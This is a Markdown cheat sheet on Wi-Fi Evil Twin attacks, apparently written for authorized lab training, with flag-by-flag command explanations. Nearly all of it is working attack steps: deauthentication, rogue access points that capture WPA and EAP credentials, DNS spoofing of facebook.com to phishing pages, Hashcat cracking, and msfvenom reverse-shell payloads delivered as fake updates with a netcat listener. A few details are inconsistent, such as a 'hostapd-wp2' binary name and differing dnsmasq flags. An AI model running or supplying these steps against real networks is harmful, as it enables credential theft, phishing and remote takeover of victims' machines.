# Wi-Fi Evil Twin Attacks

> **Purpose:** Reference for building and using rogue (“Evil Twin”) Wi-Fi access points, routing victim traffic, and capturing credentials/handshakes in **authorized lab environments only**.  
> **Audience:** Students and red-teamers practicing Wi-Fi attacks on test networks they own or have explicit permission to assess.

⚠️ **Legal / Ethical reminder:**  
Only use these techniques on networks where you have explicit, written permission. Unauthorized use is illegal and unethical.

---

## 1. Manual Evil Twin Attacks – Enumeration & Deauthentication

### Concept

First, you:

1. Put your wireless card into **monitor mode**.
    
2. **Discover** nearby access points and clients.
    
3. Optionally, **deauthenticate** clients to force reconnections or push them onto your rogue AP.
    

---

### 1.1 Enumeration (Monitor Mode & Scanning)

#### Command: Enable monitor mode

```bash
sudo airmon-ng start wlan0
```

**What this does:**  
Starts monitor mode on `wlan0`, typically creating `wlan0mon`, so you can passively capture 802.11 frames.

**Expression-by-expression:**

- `sudo` – run with root privileges (required for wireless interface changes).
    
- `airmon-ng` – Aircrack-ng helper tool to manage monitor mode interfaces.
    
- `start` – subcommand to _start_ monitor mode on a given interface.
    
- `wlan0` – original wireless interface name.
    

---

#### Command: Basic network scan

```bash
sudo airodump-ng wlan0mon
```

**What this does:**  
Passively scans for nearby access points and clients, showing BSSIDs, channels, encryption, and associated stations.

**Expression-by-expression:**

- `sudo` – root privileges.
    
- `airodump-ng` – capture/display 802.11 traffic.
    
- `wlan0mon` – monitor-mode interface created by `airmon-ng`.
    

---

#### Command: Scan and save traffic on a specific channel

```bash
sudo airodump-ng wlan0mon -w HTB -c 1
```

**What this does:**  
Scans channel 1 and **saves capture files** with prefix `HTB` (e.g., `HTB-01.cap`).

**Expression-by-expression:**

- `sudo` – root privileges.
    
- `airodump-ng` – packet capture and Wi-Fi scanner.
    
- `wlan0mon` – monitor interface to listen on.
    
- `-w HTB` – write output files with prefix `HTB` (CAP, CSV, etc.).
    
- `-c 1` – restrict capture to **channel 1** (no channel hopping).
    

---

### 1.2 Deauthentication (Forcing Clients to Reconnect)

You can deauth:

- An entire AP (all clients).
    
- A **specific** client associated with that AP.
    

#### Command: Deauth the entire AP (two equivalent variants exist in the PDF)

```bash
sudo aireplay-ng --deauth 5 -a D4:C1:8B:79:AD:45 wlan0mon
```

**What this does:**  
Sends 5 deauthentication frames from your interface to the AP, kicking off all clients (or many of them).

**Expression-by-expression:**

- `sudo` – required for injection.
    
- `aireplay-ng` – packet injection tool from Aircrack-ng.
    
- `--deauth 5` – perform a **deauth attack**, sending 5 deauth frames.
    
- `-a D4:C1:8B:79:AD:45` – AP BSSID (MAC address) to target.
    
- `wlan0mon` – monitor-mode interface used for injection.
    

---

#### Command: Deauth a specific client

```bash
sudo aireplay-ng --deauth 5 -a D4:C1:8B:79:AD:45 -c 02:00:00:00:01:00 wlan0mon
```

**What this does:**  
Sends deauth frames aimed specifically at client `02:00:00:00:01:00` connected to AP `D4:C1:8B:79:AD:45`.

**Expression-by-expression:**

- `sudo` – root privileges.
    
- `aireplay-ng` – deauth/injection tool.
    
- `--deauth 5` – send 5 deauth frames.
    
- `-a D4:C1:8B:79:AD:45` – target AP BSSID.
    
- `-c 02:00:00:00:01:00` – **client** MAC address to deauthenticate.
    
- `wlan0mon` – monitor-mode interface.
    

---

## 2. Routing Commands & Configuration (dnsmasq, NAT, IP Forwarding)

### Concept

To make a convincing Evil Twin:

- The victim must get an IP address from **your** DHCP.
    
- DNS should point victims to your machine.
    
- Traffic should be routed/NATed out to the Internet (or to your tooling).
    

This is handled with **dnsmasq**, **dnsspoof**, and **iptables**.

---

### 2.1 `dns.conf` – DNS & DHCP Configuration

```ini
interface=wlan1
dhcp-range=192.168.0.2,192.168.0.254,255.255.255.0,10h
dhcp-option=3,192.168.0.1
dhcp-option=6,192.168.0.1
server=8.8.4.4
server=8.8.8.8
listen-address=127.0.0.1
address=/#/192.168.0.1
log-dhcp
log-queries
```

**What this does:**  
Configures `dnsmasq` to act as **DHCP + DNS server** on `wlan1`, giving victims IPs in `192.168.0.0/24`, routing DNS through your machine.

**Directive-by-directive:**

- `interface=wlan1` – bind DNS/DHCP service to interface `wlan1` (your rogue AP interface).
    
- `dhcp-range=192.168.0.2,192.168.0.254,255.255.255.0,10h`
    
    - Start IP: `192.168.0.2`
        
    - End IP: `192.168.0.254`
        
    - Netmask: `255.255.255.0`
        
    - Lease time: `10h` (10 hours).
        
- `dhcp-option=3,192.168.0.1` – DHCP option 3 (default gateway) → `192.168.0.1` (your box).
    
- `dhcp-option=6,192.168.0.1` – DHCP option 6 (DNS server) → `192.168.0.1` (your box).
    
- `server=8.8.4.4` / `server=8.8.8.8` – upstream DNS servers (Google DNS) for queries not overridden.
    
- `listen-address=127.0.0.1` – only listen on localhost (dnsmasq process listens on 127.0.0.1; iptables or local apps may forward).
    
- `address=/#/192.168.0.1` – wildcard mapping: **all domains** (`/#/`) resolve to `192.168.0.1`.
    
- `log-dhcp` – log DHCP leases/transactions.
    
- `log-queries` – log DNS queries.
    

---

### 2.2 Routing & NAT Commands

#### Command: Start dnsmasq with this config

```bash
sudo dnsmasq -C dns.conf -d
```

**What this does:**  
Launches `dnsmasq` with the specified configuration file and keeps it running in the foreground.

**Expression-by-expression:**

- `sudo` – root privileges.
    
- `dnsmasq` – lightweight DNS/DHCP server.
    
- `-C dns.conf` – use config file `dns.conf`.
    
- `-d` – **do not daemonize**, stay in the foreground (useful for debugging/logs).
    

---

#### Command: Assign IP to AP interface

```bash
sudo ifconfig wlan1 192.168.0.1/24
```

**What this does:**  
Gives `wlan1` the IP address `192.168.0.1` with netmask `/24`, matching your DHCP range.

**Expression-by-expression:**

- `sudo` – root privileges.
    
- `ifconfig` – configure network interface (legacy but common).
    
- `wlan1` – wireless interface hosting the rogue AP.
    
- `192.168.0.1/24` – IP address and subnet mask (255.255.255.0).
    

---

#### Command: Enable IP forwarding

```bash
sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
```

**What this does:**  
Turns on IPv4 forwarding in the kernel so your machine can route packets between interfaces.

**Expression-by-expression:**

- `sudo` – root privileges.
    
- `sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'` – shell command run as root which:
    
    - `echo 1` – outputs `1`.
        
    - `>` redirection – writes to sysctl file.
        
    - `/proc/sys/net/ipv4/ip_forward` – kernel parameter: `1` = forwarding enabled, `0` = disabled.
        

---

#### Commands: Temporarily bring `wlan1` down, change MAC, bring it back up

```bash
sudo ifconfig wlan1 down
sudo macchanger -m D4:C1:8B:79:AD:44 wlan1
sudo ifconfig wlan1 up
```

**What this does:**  
Spoofs the MAC on `wlan1` to `D4:C1:8B:79:AD:44` (to mimic a target AP or hide your adapter identity).

**Expression-by-expression:**

1. `sudo ifconfig wlan1 down`
    
    - `ifconfig` – interface config tool.
        
    - `wlan1` – target interface.
        
    - `down` – disable interface temporarily.
        
2. `sudo macchanger -m D4:C1:8B:79:AD:44 wlan1`
    
    - `macchanger` – tool to change MAC address.
        
    - `-m D4:C1:8B:79:AD:44` – set MAC to this value (manual).
        
    - `wlan1` – interface whose MAC is changed.
        
3. `sudo ifconfig wlan1 up`
    
    - `up` – re-enable interface, now with spoofed MAC.
        

---

#### Command: DNS spoofing of victim traffic

```bash
sudo dnsspoof -i wlan1
```

**What this does:**  
Intercepts DNS requests on interface `wlan1` and responds with spoofed answers (based on hosts file, etc.), redirecting victims to your host.

**Expression-by-expression:**

- `sudo` – root privileges.
    
- `dnsspoof` – DNS spoofing tool (usually part of dsniff).
    
- `-i wlan1` – listen and inject DNS responses on `wlan1`.
    

---

#### Commands: NAT masquerading and forwarding

```bash
sudo iptables --append POSTROUTING --table nat --out-interface eth0 -j MASQUERADE
sudo iptables --append FORWARD --in-interface wlan0 -j ACCEPT
```

**What this does:**

- First command: sets up **NAT** (masquerade) for traffic leaving `eth0` (your Internet uplink).
    
- Second command: allows forwarding of traffic arriving on `wlan0` (or your rogue AP side).
    

**Expression-by-expression (first line):**

- `sudo` – root privileges.
    
- `iptables` – IPv4 packet filter/NAT configuration tool.
    
- `--append POSTROUTING` – add a rule at end of `POSTROUTING` chain.
    
- `--table nat` – operate on the NAT table.
    
- `--out-interface eth0` – match packets leaving interface `eth0`.
    
- `-j MASQUERADE` – apply source NAT (hide internal IPs behind `eth0` IP).
    

**Expression-by-expression (second line):**

- `sudo` – root privileges.
    
- `iptables` – firewall tool.
    
- `--append FORWARD` – append rule to `FORWARD` chain.
    
- `--in-interface wlan0` – match packets entering via `wlan0` (here used for wireless side; adapt to your actual interface).
    
- `-j ACCEPT` – accept matching traffic (allow forwarding).
    

---

## 3. Password Cracking (Captured Handshakes & NetNTLM)

### Concept

The Evil Twin can capture:

- WPA/WPA2 handshakes ⇒ crack with Hashcat.
    
- NetNTLM hashes (from corporate/EAP flows) ⇒ crack with Hashcat `-m 5500`.
    

---

### 3.1 Converting and Cracking WPA/WPA2 Handshakes

#### Command: Convert `.hccapx` to `.pcap`

```bash
hcxhash2cap --hccapx=handshake.hccapx -c handshake.pcap
```

**What this does:**  
Takes a `handshake.hccapx` file (Hashcat style) and converts it back into a `.pcap` capture.

**Expression-by-expression:**

- `hcxhash2cap` – tool for converting between hash formats and capture files.
    
- `--hccapx=handshake.hccapx` – input file in hccapx format.
    
- `-c handshake.pcap` – output capture file.
    

---

#### Command: Convert `.pcap` to Hashcat 22000 hash

```bash
hcxpcapngtool handshake.pcap -o hash.22000
```

**What this does:**  
Takes a standard `.pcap` and converts WPA/WPA2 handshakes/PMKIDs into a Hashcat-compatible `22000` hash file.

**Expression-by-expression:**

- `hcxpcapngtool` – conversion tool for pcap/pcapng → hash.
    
- `handshake.pcap` – input capture file.
    
- `-o hash.22000` – output file containing WPA hash in mode 22000 format.
    

---

#### Command: Crack WPA/WPA2 hash

```bash
hashcat -a 0 -m 22000 hash.22000 /opt/wordlist.txt --force
```

**What this does:**  
Runs Hashcat in **straight dictionary mode** (`-a 0`) against WPA/WPA2 hash file `hash.22000` using `/opt/wordlist.txt`.

**Expression-by-expression:**

- `hashcat` – GPU/CPU password cracker.
    
- `-a 0` – attack mode 0 (straight dictionary).
    
- `-m 22000` – hash mode 22000 (WPA-PBKDF2/PMKID+EAPOL).
    
- `hash.22000` – hash file generated by `hcxpcapngtool`.
    
- `/opt/wordlist.txt` – wordlist to try as candidate passwords.
    
- `--force` – bypass some warnings (use cautiously; acknowledges you know what you’re doing).
    

---

### 3.2 Cracking NetNTLM Hashes

#### Command: Crack NetNTLM with Hashcat

```bash
hashcat -m 5500 -a 0 Administrator::::54as5<SNIP>5s5:as65a4sd564d1a2s wordlist.dict
```

**What this does:**  
Cracks a captured **NetNTLM** hash using a dictionary attack.

**Expression-by-expression:**

- `hashcat` – password cracking tool.
    
- `-m 5500` – hash mode 5500 (NetNTLMv1/v2, depending on variant).
    
- `-a 0` – straight dictionary mode.
    
- `Administrator::::54as5<SNIP>5s5:as65a4sd564d1a2s` – example NetNTLM hash line (username + hash).
    
- `wordlist.dict` – wordlist of candidate passwords.
    

---

## 4. Rogue Access Point Usage (hostapd, hostapd-mana, hostapd-wpe)

### Concept

You can create a rogue AP using:

- **hostapd** – standard AP daemon.
    
- **hostapd-mana** – patched hostapd with Evil Twin & credential-harvesting features.
    
- **hostapd-wpe** – hostapd with **Wireless Pwnage Edition** patches aimed at WPA-Enterprise (EAP).
    

---

### 4.1 Launching Rogue AP Binaries

```bash
sudo hostapd hostapd.conf
sudo hostapd-mana hostapd.conf
sudo hostapd-wp2 hostapd.conf
```

**What this does:**

- First line: launch a standard AP with hostapd.
    
- Second line: launch an AP with **hostapd-mana** features.
    
- Third line: launch **hostapd-wpe** (here named `hostapd-wp2` in the PDF) to attack WPA-Enterprise/EAP.
    

**Expression-by-expression (for each):**

- `sudo` – root privileges.
    
- `hostapd` / `hostapd-mana` / `hostapd-wp2` – specific hostapd binary:
    
    - `hostapd` – stock AP daemon.
        
    - `hostapd-mana` – mana-patched Evil Twin AP.
        
    - `hostapd-wp2` – wpe (Wireless Pwnage Edition), for EAP credential capture.
        
- `hostapd.conf` – configuration file describing SSID, security, EAP, etc.
    

---

### 4.2 Example `hostapd.conf` Configurations

#### 4.2.1 Open Network

```ini
interface=wlan1
hw_mode=g
ssid=HTB-Corp
channel=1
driver=nl80211
```

**Meaning:**

- `interface=wlan1` – use `wlan1` for the AP.
    
- `hw_mode=g` – operate in 2.4 GHz 802.11g mode.
    
- `ssid=HTB-Corp` – broadcast SSID “HTB-Corp”.
    
- `channel=1` – use channel 1.
    
- `driver=nl80211` – use Linux `nl80211` driver interface.
    

---

#### 4.2.2 Mana Loud (Evil Twin with loud cloning)

```ini
interface=wlan1
driver=nl80211
hw_mode=g
channel=1
ssid=Anything
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=Anything

# Mana Configuration
enable_mana=1
mana_loud=1
```

**Meaning:**

- Standard Wi-Fi parameters:
    
    - `interface`, `driver`, `hw_mode`, `channel` – like before.
        
    - `ssid=Anything` – SSID broadcasted as “Anything”.
        
    - `wpa=2` – WPA2.
        
    - `wpa_key_mgmt=WPA-PSK` – pre-shared key mode.
        
    - `wpa_pairwise=TKIP CCMP` – allow TKIP & CCMP ciphers.
        
    - `wpa_passphrase=Anything` – PSK = “Anything”.
        
- Mana-specific directives:
    
    - `enable_mana=1` – turn on mana functionality.
        
    - `mana_loud=1` – “loud” mode (aggressively responds to more probe requests / ESSIDs).
        

---

#### 4.2.3 WPA2 Handshake Capture with Mana

```ini
interface=wlan1
driver=nl80211
hw_mode=g
channel=1
ssid=HackMe
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=anything
mana_wpaout=handshake.hccapx
```

**Meaning:**

- Same basic WPA2 PSK setup as above.
    
- `ssid=HackMe` – network name to impersonate.
    
- `mana_wpaout=handshake.hccapx` – write captured handshakes to `handshake.hccapx` automatically for cracking later.
    

---

#### 4.2.4 Enterprise Rogue AP (hostapd / hostapd-mana / hostapd-wpe)

```ini
# 802.11 Options
interface=wlan1
ssid=HTB-Wireless
channel=1
auth_algs=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=TKIP CCMP
wpa=3
hw_mode=g
ieee8021x=1

# EAP Configuration
eap_server=1
eap_user_file=hostapd.eap_user

# Certificates
ca_cert=ca.pem
server_cert=server.pem
private_key=server-key.pem
private_key_passwd=whatever
dh_file=dh.pem

# Hostapd-mana Edition
# Remove comments and reload to activate
#enable_mana=1
#mana_loud=1
#mana_credout=credentials.creds
#mana_eapsuccess=1
#mana_wpe=1
```

**Key points:**

- `auth_algs=3` – allow both open and shared key authentication.
    
- `wpa_key_mgmt=WPA-EAP` – WPA-Enterprise with EAP authentication.
    
- `wpa=3` – WPA+WPA2.
    
- `ieee8021x=1` – enable 802.1X (Enterprise auth).
    
- `eap_server=1` – hostapd acts as EAP server.
    
- `eap_user_file=hostapd.eap_user` – user/EAP method mapping file.
    
- Certificates:
    
    - `ca_cert` – CA certificate.
        
    - `server_cert` – server certificate.
        
    - `private_key`, `private_key_passwd` – key and optional password.
        
    - `dh_file` – Diffie-Hellman params file for TLS.
        
- Mana extras (commented by default):
    
    - `enable_mana`, `mana_loud`, `mana_credout`, `mana_eapsuccess`, `mana_wpe` – features for Evil Twin credential capture and EAP handling when using `hostapd-mana`.
        

---

#### 4.2.5 EAP Method Negotiation (`hostapd.eap_user`)

```ini
* PEAP,TTLS,TLS,MD5,GTC,FAST
"t" TTLS-PAP,GTC,TTLS-CHAP,TTLS-MSCHAP,TTLS-MSCHAPV2,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAP "challenge1234" [2]
```

**Meaning:**

- `* PEAP,TTLS,TLS,MD5,GTC,FAST`
    
    - For all users (`*`), support these EAP methods: PEAP, TTLS, TLS, MD5, GTC, FAST.
        
- `"t" ... "challenge1234" [2]`
    
    - For identity `t`, allow these inner methods, with a specified challenge and priority `[2]`.
        
    - Methods include TTLS-PAP, TTLS-CHAP, TTLS-MSCHAP, TTLS-MSCHAPV2, MSCHAPV2, MD5, GTC, etc.
        

---

## 5. Automated Evil Twin Attacks – Wifiphisher & EAPHammer

### Concept

Instead of manually wiring everything, you can use:

- **Wifiphisher** – automated Evil Twin + phishing workflows.
    
- **EAPHammer** – focused on WPA-Enterprise Evil Twins, ESSID stripping, and cert handling.
    

---

### 5.1 Wifiphisher Workflows

#### Command: Reset NetworkManager before starting

```bash
sudo systemctl restart NetworkManager
```

**What this does:**  
Ensures your Wi-Fi interfaces are reset to a clean state before Wifiphisher manipulates them.

**Expression-by-expression:**

- `sudo` – root privileges.
    
- `systemctl` – systemd service manager.
    
- `restart NetworkManager` – restart the `NetworkManager` service.
    

---

#### Command: OAuth phishing Evil Twin

```bash
wifiphisher --essid "FREE WI-FI" -p oauth-login -kB -kN
```

**What this does:**  
Launches an Evil Twin AP named **FREE WI-FI** and presents an OAuth login phishing page.

**Expression-by-expression:**

- `wifiphisher` – automated Evil Twin / phishing toolkit.
    
- `--essid "FREE WI-FI"` – name of fake Wi-Fi network to broadcast.
    
- `-p oauth-login` – use the **OAuth login** phishing template.
    
- `-kB` – keep or kill _Browser_ connections (in Wifiphisher context, typically kills legitimate sessions / prevents auto-reconnect; see Wifiphisher docs).
    
- `-kN` – kill existing **NetworkManager** connections (so victims get pushed to the rogue AP).
    

---

#### Command: Firmware upgrade phishing + handshake capture

```bash
wifiphisher -aI wlan0 -eI wlan1 -p firmware-upgrade --handshake-capture HTB-01.cap -kN
```

**What this does:**

- Uses one interface to **jam** or act as AP and another as Evil Twin radio.
    
- Presents a **firmware upgrade** phishing page.
    
- Captures a WPA/WPA2 handshake to `HTB-01.cap`.
    

**Expression-by-expression:**

- `wifiphisher` – toolkit.
    
- `-aI wlan0` – **AP/jamming interface** (e.g., for deauth or for AP).
    
- `-eI wlan1` – **Evil Twin interface** to host the fake AP.
    
- `-p firmware-upgrade` – phishing template masquerading as firmware update.
    
- `--handshake-capture HTB-01.cap` – save captured handshake to this file.
    
- `-kN` – kill NetworkManager connections.
    

---

#### Commands: Generate malicious payloads (for plugin / firmware phishing)

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > shell.exe
```

**What this does:**  
Creates Linux and Windows reverse shell payloads for use in phishing scenarios (only in **legal red-team labs**).

**Expression-by-expression (per line):**

- `msfvenom` – Metasploit payload generator.
    
- `-p linux/x64/shell_reverse_tcp` / `windows/x64/shell_reverse_tcp` – payload type (reverse shell).
    
- `LHOST=10.0.0.1` – your listener IP.
    
- `LPORT=4444` – port where you’ll receive the shell.
    
- `-f elf` / `-f exe` – output format: Linux ELF or Windows EXE.
    
- `> shell.elf` / `> shell.exe` – write to file.
    

---

#### Command: Plugin update phishing with payload

```bash
wifiphisher -aI wlan0 -eI wlan1 -p plugin_update --payload-path /home/wifi/shell.elf -kN
```

**What this does:**  
Hosts a “plugin update” phishing page that serves your `shell.elf` payload to victims.

**Expression-by-expression:**

- `wifiphisher` – toolkit.
    
- `-aI wlan0` / `-eI wlan1` – as above.
    
- `-p plugin_update` – phishing scenario: fake plugin update.
    
- `--payload-path /home/wifi/shell.elf` – file to deliver as "update".
    
- `-kN` – kill NetworkManager connections.
    

---

#### Command: Netcat listener for reverse shell

```bash
nc -nvlp 4444
```

**What this does:**  
Starts a simple TCP listener on port 4444, waiting for a reverse shell.

**Expression-by-expression:**

- `nc` – netcat.
    
- `-n` – numeric IP addresses only (don’t do DNS lookups).
    
- `-v` – verbose output.
    
- `-l` – listen mode.
    
- `-p 4444` – listen on port 4444.
    

---

### 5.2 EAPHammer – Enterprise Evil Twin & ESSID Stripping

#### Command: Generate certificates for rogue AP

```bash
sudo /opt/eaphammer/eaphammer --cert-wizard
```

**What this does:**  
Runs EAPHammer’s certificate wizard to create self-signed CA/server certs for WPA-Enterprise Evil Twin.

**Expression-by-expression:**

- `sudo` – root privileges.
    
- `/opt/eaphammer/eaphammer` – EAPHammer binary.
    
- `--cert-wizard` – interactive wizard to generate necessary TLS certificates.
    

---

#### Command: Launch ESSID-stripped rogue AP

```bash
sudo /opt/eaphammer/eaphammer -i wlan1 --auth wpa-eap --essid HTB-Wireless --creds --negotiate balanced --essid-stripping '\x20'
```

**What this does:**  
Creates an Enterprise **Evil Twin** using ESSID stripping (e.g., adding a trailing space) to trick clients into connecting.

**Expression-by-expression:**

- `sudo` – root.
    
- `/opt/eaphammer/eaphammer` – EAPHammer binary.
    
- `-i wlan1` – interface used for AP.
    
- `--auth wpa-eap` – WPA-Enterprise (EAP) mode.
    
- `--essid HTB-Wireless` – ESSID to clone (corporate Wi-Fi).
    
- `--creds` – log captured credentials / hashes.
    
- `--negotiate balanced` – balanced EAP negotiation profile.
    
- `--essid-stripping '\x20'` – modify ESSID using **stripping trick**.
    

**ESSID stripping characters:**

```text
\x20  # add a space after ESSID
\x00  # NULL terminator: clients may ignore trailing chars
\t    # tab after ESSID
\r    # carriage return after ESSID
\n    # newline after ESSID
```

These variations can confuse clients into preferring the rogue AP if their ESSID comparison logic is flawed.

---

## 6. MITM Attacks – DNS Spoofing with Wifipumpkin3

### Concept

Once victims connect to the Evil Twin, you can:

- Run a **DNS spoofing** MITM to redirect specific domains (e.g., corporate intranet, major sites) to your phishing servers.
    

---

### 6.1 Wifipumpkin3 Console Flow

The following commands are typed **inside** the `wifipumpkin3` interactive console.

```bash
sudo wifipumpkin3
set interface wlan1
set ssid HTB-Corp
set proxy noproxy
ignore pydns_server
ap
show
use spoof.dns_spoof
set domains academy.hackthebox.com,facebook.com
set redirectTo 10.0.0.1
start
back
start
```

**What this does (line by line):**

1. `sudo wifipumpkin3`
    
    - Launch Wifipumpkin3 GUI/console as root.
        
2. `set interface wlan1`
    
    - Use `wlan1` as the AP interface.
        
3. `set ssid HTB-Corp`
    
    - Broadcast SSID “HTB-Corp”.
        
4. `set proxy noproxy`
    
    - Disable HTTP/HTTPS proxy module.
        
5. `ignore pydns_server`
    
    - Exclude `pydns_server` module (avoid conflicts with DNS spoofing).
        
6. `ap`
    
    - Show current AP configuration.
        
7. `show`
    
    - List available modules.
        
8. `use spoof.dns_spoof`
    
    - Select the `dns_spoof` plugin.
        
9. `set domains academy.hackthebox.com,facebook.com`
    
    - Choose domains to spoof.
        
10. `set redirectTo 10.0.0.1`
    
    - Redirect these domains to IP `10.0.0.1` (your phishing server).
        
11. `start`
    
    - Start DNS spoofing.
        
12. `back`
    
    - Exit module config and return to main console.
        
13. `start`
    
    - Start the rogue AP with current configuration.
        

---

## 7. Phishing Web Server – Apache Virtual Hosts

### Concept

To serve realistic phishing content for different hostnames, configure **Apache virtual hosts** matching your spoofed domains.

---

### 7.1 Virtual Host Files

**`/etc/apache2/sites-available/intranet1.conf`**

```apache
<VirtualHost *:80>
  ServerAdmin admin@hackthebox.com
  ServerName academy.hackthebox.com
  ServerAlias www.academy.hackthebox.com
  DocumentRoot /var/www/html
  ErrorLog ${APACHE_LOG_DIR}/error.log
  CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```

**`/etc/apache2/sites-available/intranet2.conf`**

```apache
<VirtualHost *:80>
  ServerAdmin admin@facebook.com
  ServerName facebook.com
  ServerAlias www.facebook.com
  DocumentRoot /var/www/html/facebook
  ErrorLog ${APACHE_LOG_DIR}/error.log
  CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```

**Meaning (high-level):**

- `VirtualHost *:80` – HTTP virtual host on port 80 for any IP.
    
- `ServerName` / `ServerAlias` – hostnames mapped to this vhost.
    
- `DocumentRoot` – directory containing phishing site content.
    
- Logging directives – standard Apache access/error logs.
    

---

### 7.2 Enabling Sites and Restarting Apache

```bash
sudo a2ensite intranet1.conf
sudo a2ensite intranet2.conf
sudo systemctl restart apache2
```

**What this does:**

- Enables the two Apache vhost configs and restarts Apache to apply changes.
    

**Expression-by-expression:**

- `sudo` – root privileges.
    
- `a2ensite intranet1.conf` – enable vhost `intranet1.conf`.
    
- `a2ensite intranet2.conf` – enable vhost `intranet2.conf`.
    
- `systemctl restart apache2` – restart Apache service.
    

---

### 7.3 Optional Deauth to Push Victims to Rogue AP

```bash
sudo aireplay-ng --deauth 5 -a 9C:9A:03:39:BD:7A wlan0mon
```

**What this does:**  
Forces clients off the real AP (BSSID `9C:9A:03:39:BD:7A`), encouraging them to join your Evil Twin instead.

**Expression-by-expression:**

- `sudo` – root.
    
- `aireplay-ng` – injection tool.
    
- `--deauth 5` – 5 deauth frames.
    
- `-a 9C:9A:03:39:BD:7A` – target AP BSSID.
    
- `wlan0mon` – monitor interface.
    

---

## 8. SSL Interception Scenario (dnsmasq + hostapd + ettercap)

### Concept

A more advanced lab scenario:

1. Run a **fake AP** (`hostapd`) on `wlan1`.
    
2. Use `dnsmasq`/`dns.conf` for DHCP/DNS.
    
3. Enable IP forwarding.
    
4. Use **Ettercap** for ARP poisoning and SSL interception (on a test LAN).
    

---

### 8.1 Routing Configuration (`dns.conf` + `hostapd.conf` recap)

`dns.conf` is the same format as Section 2.1 (DHCP/DNS for `wlan1`).  
`hostapd.conf` (simplified):

```ini
interface=wlan1
hw_mode=g
ssid=HTB-Corp
channel=1
driver=nl80211
```

These define:

- Rogue AP called **HTB-Corp** on `wlan1`.
    
- DHCP/DNS handing out IPs and routing via `192.168.0.1`.
    

---

### 8.2 Commands: Bring it all together

```bash
sudo ifconfig wlan1 192.168.0.1/24
sudo dnsmasq -c dns.conf -d
sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
sudo hostapd hostapd.conf
ettercap -T -q -M ARP -i wlan1
```

**What this does (line by line):**

1. `sudo ifconfig wlan1 192.168.0.1/24`
    
    - Assign AP interface IP (gateway for clients).
        
2. `sudo dnsmasq -c dns.conf -d`
    
    - Start DNS/DHCP server with `dns.conf` in foreground.
        
3. `sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'`
    
    - Enable IP forwarding.
        
4. `sudo hostapd hostapd.conf`
    
    - Launch the AP with SSID `HTB-Corp`.
        
5. `ettercap -T -q -M ARP -i wlan1`
    
    - `ettercap` – MITM/ARP poisoning tool.
        
    - `-T` – text-only interface.
        
    - `-q` – quiet mode.
        
    - `-M ARP` – ARP MITM mode.
        
    - `-i wlan1` – operate on interface `wlan1`.
        

This forms an SSL interception testbed (assuming additional SSL-intercept plugins / certs are configured in Ettercap or other tools).